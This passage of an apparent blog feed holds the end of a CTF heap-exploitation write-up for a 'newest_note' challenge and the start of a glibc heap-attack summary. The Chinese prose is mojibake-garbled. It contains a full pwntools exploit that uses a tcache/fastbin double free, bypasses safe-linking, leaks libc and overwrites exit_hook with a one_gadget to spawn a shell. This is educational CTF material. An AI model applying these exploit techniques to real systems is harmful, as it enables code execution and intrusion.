free</span><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># pause()</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e5ae010babec4989a45fa29018da4cb4.png" alt="img"></p><p>ç„¶åç”³è¯·chunkï¼Œæ­¤æ—¶ä»tcacheä¸­å–å‡ºæœ€åä¸€ä¸ªchunkã€‚ç”±äºæ­¤æ—¶tcacheä¸­ä»…å‰©6ä¸ªchunkï¼Œæˆ‘ä»¬å†å¯¹7å·chunkè¿›è¡Œfreeæ—¶ï¼Œå®ƒä¾¿ä¼šæ”¾å…¥tcacheä¸­ã€‚é€šè¿‡è¿™æ ·çš„doublefreeæˆ‘ä»¬æ„é€ äº†ä¸€ä¸ªå³åœ¨Tcacheåˆåœ¨fastbinçš„chunkï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="https://img-blog.csdnimg.cn/839aa64c464c4ab1a42b524daf40f730.png" alt="img"></p><p> æ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¯ä»¥å¼€å§‹æ„é€ fake fastbinï¼Œéœ€è¦æ³¨æ„çš„æ˜¯fastbinä¸­çš„fdæŒ‡é’ˆåŒæ ·éœ€è¦å¼‚æˆ–å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æ„,æ­¤æ—¶tcacheé“¾é•¿åº¦ä¸º0ï¼Œfastbinçš„é•¿åº¦ä¸º7.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">10</span>,p64(key^(heap_base+<span class="hljs-number">0x480</span>)))<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x440</span>)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x400</span>)))<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x3a0</span>)))<br>add(<span class="hljs-number">3</span>,p64(key^(heap_base+<span class="hljs-number">0x380</span>)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x340</span>)))<br>add(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key)) <span class="hljs-comment">##7</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5e6f8e3dac8945b28ddf8b4794c3395f.png" alt="img"></p><h3 id="ä¸‰ã€ä¼ªé€ tcacheé“¾å¹¶æ³„éœ²libc"><a href="#ä¸‰ã€ä¼ªé€ tcacheé“¾å¹¶æ³„éœ²libc" class="headerlink" title="ä¸‰ã€ä¼ªé€ tcacheé“¾å¹¶æ³„éœ²libc"></a>ä¸‰ã€ä¼ªé€ tcacheé“¾å¹¶æ³„éœ²libc</h3><p> æ­¤æ—¶æˆ‘ä»¬è°ƒç”¨add()ï¼Œå°±ä¼šè§¦å‘fastbinå’Œtcacheçš„stashæœºåˆ¶ï¼Œæ­¤æ—¶å…¶ä½™6ä¸ªchunkä¾¿ä¼šæ‰”åˆ°tcacheä¸­ï¼Œå…¶ç»“æ„å¦‚ä¸‹æ‰€ç¤º</p><blockquote><p> å½“ä» fastbin é‡Œå– chunk æ—¶ï¼Œå…¶ä½™çš„ chunk ä¼šè¢«ä¾æ¬¡æ”¾å…¥å¯¹åº”çš„ tcache ä¸­ï¼Œç»ˆæ­¢æ¡ä»¶æ—¶ fastbin é“¾ä¸ºç©ºæˆ–è€… tcache è£…æ»¡ã€‚</p></blockquote><p><img src="https://img-blog.csdnimg.cn/687aa9ca42f04f08895b1958d2ae0c29.png" alt="img"></p><p> å†æ¬¡addï¼Œtcacheå’Œfastbinçš„å–å‡ºé¡ºåºæ˜¯ç›¸åçš„ï¼Œå³tcacheæœ€ä¸Šæ–¹çš„chunkå°†è¢«å–å‡ºï¼ŒåŒæ—¶ç¼–è¾‘å†…å®¹æ›´æ”¹<strong>0x56309de85360</strong>çš„å¤´éƒ¨sizeå¤§å°ä¸º0x441ã€‚ä¹‹åæˆ‘ä»¬åªéœ€è¦freeæ‰360å¤„çš„chunkä¾¿å¯æ³„éœ²libc</p><blockquote><p> fastbinæœ€å¤§ä¸º0x410,è¿™é‡Œç”¨0x441åˆšå¥½å¯ä»¥å¯¹é½chunk</p></blockquote><p><img src="https://img-blog.csdnimg.cn/60c6e7ed5e2d4633b5226a7183ab38d7.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">## change head of 4 </span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x441</span>))<br><br>free(<span class="hljs-number">4</span>) <br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x218cc0</span><br>success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>exit_hook = libc_base + <span class="hljs-number">0x21a6c8</span><br>one_gadget = libc_base + <span class="hljs-number">0xeeccc</span><br>success(<span class="hljs-string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(exit_hook))<br></code></pre></td></tr></table></figure><blockquote><p> è¿™é‡Œæ²¡æœ‰é€‰æ‹©freehookæˆ–è€…mallochookæ˜¯å› ä¸ºæ²¡æœ‰åˆé€‚çš„onegadgetï¼Œé€‰æ‹©åŠ«æŒexithook</p></blockquote><h3 id="å››ã€åŠ«æŒexithook"><a href="#å››ã€åŠ«æŒexithook" class="headerlink" title="å››ã€åŠ«æŒexithook"></a>å››ã€åŠ«æŒexithook</h3><p>ç”±äºæˆ‘ä»¬åœ¨tcacheé“¾é‡ŒæŠ˜å äº†ä¸¤ä¸ªchunkè¿™æ ·ä¾¿å¯ä»¥è½»æ¾çš„æ›´æ”¹freechunkçš„å†…å®¹ï¼ŒåŠ«æŒexithookä¸ºongadgetç„¶åç»“æŸç¨‹åºä¾¿å¯ï¼Œæœ€ç»ˆç»“æ„å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">11</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>)+p64(key^(exit_hook-<span class="hljs-number">0x8</span>)))<br>add(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(one_gadget))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/6d12cf8cb53c453683ef5ee3ddc6f2d2.png" alt="img"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./newest_note&#x27;</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,text</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>    io.send(text)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>io.recvuntil(<span class="hljs-string">&#x27;How many pages your notebook will be? :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    free(i)<br><span class="hljs-comment">## double free</span><br>free(<span class="hljs-number">7</span>)<br>pause()<br>add(<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">## fake tcache</span><br>add(<span class="hljs-number">10</span>,p64(key^(heap_base+<span class="hljs-number">0x480</span>)))<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x440</span>)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x400</span>)))<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x3a0</span>)))<br>add(<span class="hljs-number">3</span>,p64(key^(heap_base+<span class="hljs-number">0x380</span>)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x340</span>)))<br>add(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key)) <span class="hljs-comment">##7</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br><span class="hljs-comment">## change head of 4 </span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x441</span>))<br><br>free(<span class="hljs-number">4</span>) <br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x218cc0</span><br>success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>exit_hook = libc_base + <span class="hljs-number">0x21a6c8</span><br>one_gadget = libc_base + <span class="hljs-number">0xeeccc</span><br>success(<span class="hljs-string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(exit_hook))<br><br>add(<span class="hljs-number">11</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>)+p64(key^(exit_hook-<span class="hljs-number">0x8</span>)))<br>add(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(one_gadget))<br><br>io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><br>io.interactive()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HEAP æ”»å‡»æ–¹å¼è®°å½•ä»¥åŠæ€»ç»“</title>
    <link href="/2022/06/03/HEAP%20%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/"/>
    <url>/2022/06/03/HEAP%20%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æ–‡ç« å¾ˆå¤šå›¾æºæ¥è‡ªNTUSTISCä¾‹ä¼šè§†é¢‘ï¼Œæ²¹ç®¡é“¾æ¥ï¼š<a href="https://www.youtube.com/watch?v=ItpJY9Lpw-o&list=PLHP-B3mcSY_5r5AJsZyTZLwjX9z8v_b5x">NTUSTISC - Pwn 3 - YouTube</a><br>ç›®å‰åªæ”¯æŒåˆ°libc2.34ç‰ˆæœ¬</p></blockquote><h2 id="Heap-Based-Buffer-Overflow"><a href="#Heap-Based-Buffer-Overflow" class="headerlink" title="Heap-Based Buffer Overflow"></a>Heap-Based Buffer Overflow</h2><p>æœ€æœ€åŸºæœ¬çš„æ”»å‡»æ–¹å¼ï¼Œç”±äºæœªå¯¹è¾“å…¥é•¿åº¦é™åˆ¶ï¼Œä¸”å †å—æ˜¯ä¸€ç‰‡è¿ç»­å­˜å‚¨çš„å†…å­˜ç©ºé—´ç‰¹æ€§ã€‚å¯¼è‡´å¯ä»¥å¯¹å…¶åé«˜åœ°å€çš„chunkçš„å„ç§ä¿¡æ¯è¿›è¡Œè¦†å†™ã€‚</p><p><img src="/img/article/1.png"></p><p><img src="/img/article/2.png"></p><h2 id="UAF-Use-after-free"><a href="#UAF-Use-after-free" class="headerlink" title="UAF(Use-after-free)"></a>UAF(Use-after-free)</h2><p>åœ¨free()æ‰chunkä¹‹åï¼ŒåŸæœ¬æŒ‡å‘chunkçš„æŒ‡é’ˆç”±äºç¨‹åºçŒ¿è‡ªèº«çš„æ‡’æƒ°ï¼Œæ²¡æœ‰å°†pointer &#x3D; NULL; å¯¼è‡´ä¾ç„¶å¯ä»¥ä½¿ç”¨è¯¥æŒ‡é’ˆè¿›è¡Œé¢å¤–çš„æ“ä½œ</p><p>UAFæ¼æ´ä¸€èˆ¬å¸¸ç”¨äºæ³„éœ²ï¼Œæˆ–è€…æ›´æ”¹å·²ç»freeæ‰çš„chunkä¸­çš„ä¿¡æ¯ï¼Œæœ€å¸¸è§ä¾¿æ˜¯libcçš„æ³„éœ²,ä»¥åŠå¯¹Tcache&#x2F;Fastbiné“¾è¡¨çš„æ§åˆ¶</p><blockquote><p>å½“ç¬¬ä¸€å—chunkè¿›å…¥unsorted binåï¼Œä»–çš„fdå’ŒbkæŒ‡é’ˆä¼šå…±åŒæŒ‡å‘main_arena+88(å…·ä½“åç§»ä¼¼ä¹ä¼šéšç€ç‰ˆæœ¬å˜åŒ–ï¼Œåšé¢˜æ—¶æ‰‹åŠ¨è°ƒè¯•å³å¯)ï¼Œæ„å‘³ç€å½“å­˜åœ¨UAFæ¼æ´æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å‡ºè¿™ä¸ªchunkçš„å†…å®¹å³èƒ½å¾—åˆ°libc</p></blockquote><h2 id="Fastbin-Dup"><a href="#Fastbin-Dup" class="headerlink" title="Fastbin Dup"></a>Fastbin Dup</h2><p>fastbin dup å®é™…æ˜¯åœ¨fastbiné“¾ä¸Šå®ç°çš„ç‹­ä¹‰çš„double freeã€‚ç”±äºfastbin è‡ªèº«æºç çš„ç¼ºé™·ï¼Œåœ¨å¯¹double free çš„æ£€æµ‹æœºåˆ¶ä»…ä»…éªŒè¯äº†å½“å‰freeæ‰çš„chunkä¸fast bin ç¬¬ä¸€ä¸ªchunkæ˜¯å¦ç›¸åŒï¼Œè€Œå¯¹äºå…¶ä»–chunkåˆ™æ²¡æœ‰åšæ£€æµ‹ã€‚å¦å¤–fastbinåœ¨freeæ—¶ä¼šæ£€æµ‹å½“å‰å½“å‰çš„chunkäºå¤´éƒ¨chunkçš„sizeå¤§å°æ˜¯å¦ç›¸åŒã€‚</p><p>é‚£ä¹ˆæ„é€ double free æ—¶åªéœ€è¦ç©¿æ’ä¸€å—å…¶ä»–çš„chunkå³å¯å®ç°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>);<br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/article/3.png"></p><p>åœ¨å®Œæˆdouble free ä¹‹åæˆ‘ä»¬åªéœ€è¦malloc è¿™é‡Œçš„chunk1 å°±èƒ½å¾—åˆ°ä¸€å— æ—¢æ˜¯allocated åˆæ˜¯ free çŠ¶æ€çš„chunkã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°±èƒ½å¯¹å…¶fdæŒ‡é’ˆè¿›è¡Œä¿®æ”¹ï¼Œä»è€Œæ§åˆ¶fastbiné“¾è¡¨çš„æ–¹å‘æ˜¯æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹ï¼Œä¾¿èƒ½å®ç°å¯¹ä»»æ„åœ°å€çš„æ§åˆ¶(è¯»å†™)</p><p><img src="/img/article/4.png"></p><blockquote><p>é¢å¤–éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p><ul><li>fastbinä¼šå¯¹chunkå¤´çš„å¤§å°è¿›è¡Œæ£€æµ‹ï¼Œé‚£ä¹ˆå›¾ä¸­maliceå¤„chunkçš„sizeéœ€è¦æ§åˆ¶å¥½</li><li>libc2.26ä¹‹åï¼Œfreeçš„å°äº0x410çš„chunkä¼šå…ˆè¿›å…¥Tcacheä¸­ï¼Œæœ€å¤šæ‰¿çº³7ä¸ªchunk</li><li>ä¸”åœ¨tcacheå¡«æ»¡ä¹‹åï¼Œmallocä¼˜å…ˆä¼šå–å‡ºtcacheä¸­çš„chunkï¼Œå¯ä»¥åˆ©ç”¨callocä¸ä¼šç”³è¯·tcacheçš„ç‰¹ç‚¹</li></ul></blockquote><h2 id="Tcache-Dup"><a href="#Tcache-Dup" class="headerlink" title="Tcache Dup"></a>Tcache Dup</h2><blockquote><p>Tcache åœ¨æœ€è¿‘çš„å‡ ä¸ªlibcä¸­åŠ å…¥äº†å¤šä¸ªæœºåˆ¶ï¼Œç”¨äºä¿è¯å…¶å®‰å…¨æ€§ï¼Œè¿™é‡Œæˆ‘å°†åˆ†ä¸åŒç‰ˆæœ¬è®¨è®º</p></blockquote><h3 id="libc2-26-libc2-28"><a href="#libc2-26-libc2-28" class="headerlink" title="libc2.26-libc2.28"></a>libc2.26-libc2.28</h3><p>åœ¨è¿™å‡ ä¸ªç‰ˆæœ¬ä¸­ï¼Œå‡ ä¹æ²¡æœ‰æ£€æµ‹æœºåˆ¶ï¼Œå¯¹åŒä¸€å—chunkç›´æ¥è¿›è¡Œdouble freeå³å¯ï¼Œç”šè‡³æ¯”fastbin dupè¿˜è¦ç®€æ˜“</p><h3 id="libc2-29-libc2-31"><a href="#libc2-29-libc2-31" class="headerlink" title="libc2.29-libc2.31"></a>libc2.29-libc2.31</h3><p>åœ¨è¿™å‡ ä¸ªç‰ˆæœ¬ä¸­ï¼Œtcache çš„ bkæŒ‡é’ˆå¤„å­˜æ”¾äº†ä¸€ä¸ª8byteçš„éšæœºæ•°ä½œä¸ºkeyï¼Œå³ä»£è¡¨è¿™å—chunkåœ¨tcacheé“¾ä¸­ã€‚æ¯æ¬¡freeæ—¶ï¼Œæ£€æµ‹bkçš„ä½ç½®çš„å€¼æ˜¯å¦ä¸ºkeyï¼Œè‹¥æ˜¯ï¼Œåˆ™ä¸ºdoublefreeã€‚</p><blockquote><p>ç»•è¿‡æ–¹å¼ï¼šå­˜åœ¨UAFæ¼æ´çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ›´æ”¹ï¼Œtcacheä¸­chunkçš„keyå€¼å³å¯</p></blockquote><h3 id="libc2-32"><a href="#libc2-32" class="headerlink" title="libc2.32"></a>libc2.32</h3><h4 id="Safe-linking-ptr-xor"><a href="#Safe-linking-ptr-xor" class="headerlink" title="Safe-linking(ptr xor)"></a>Safe-linking(ptr xor)</h4><p>libc2.32ä¸­å¼•å…¥äº†Safe-linkingæœºåˆ¶ï¼Œåº”ç”¨äºfastbinå’Œtcacheä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br><span class="hljs-comment">/* Mark this chunk as â€œin the tcacheâ€ so the test in _int_free will</span><br><span class="hljs-comment">detect a double free.  */</span><br>e-&gt;key = tcache;<br><br>e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>tcache-&gt;entries[tc_idx] = e;<br>++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç»glibc-2.32æ›´æ–°åï¼Œe-&gt;nextä¸å†æ˜¯ç›´æ¥æŒ‡å‘åŸæ¥çš„tcacheå¤´æŒ‡é’ˆï¼Œè€Œæ˜¯æŒ‡å‘äº†ç»PROTECT_PTRå¤„ç†è¿‡çš„æŒ‡é’ˆï¼ŒæŸ¥çœ‹PROTECT_PTRå®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)));</span><br></code></pre></td></tr></table></figure><p>ç»“åˆtcache_put()å‡½æ•°å¯ä»¥å¾—å‡ºe-&gt;nextæœ€ç»ˆæŒ‡å‘äº†e-&gt;nextåœ°å€å³ç§»12ä½åçš„å€¼ä¸å½“å‰tcacheå¤´æŒ‡é’ˆå€¼å¼‚æˆ–çš„ç»“æœï¼Œè¿™é‡Œå¼•ç”¨Safe-Linkingè®¾è®¡å¸ˆæ–‡ç« [1]ä¸­çš„ä¸€å¼ å›¾æè¿°æ­¤è¿‡ç¨‹ï¼š</p><p><img src="/img/article/5.png" alt="img"></p><p>å…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„å¼‚æˆ–æ“ä½œï¼Œè¿™é‡Œæ‰€æœ‰çš„æŒ‡é’ˆéƒ½è¿›è¡Œäº†å¤„ç†ï¼Œå…·ä½“ç»†èŠ‚å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢ï¼Œä¸è¿‡å¤šèµ˜è¿°</p><h4 id="å†…å­˜å¯¹é½æ£€æµ‹"><a href="#å†…å­˜å¯¹é½æ£€æµ‹" class="headerlink" 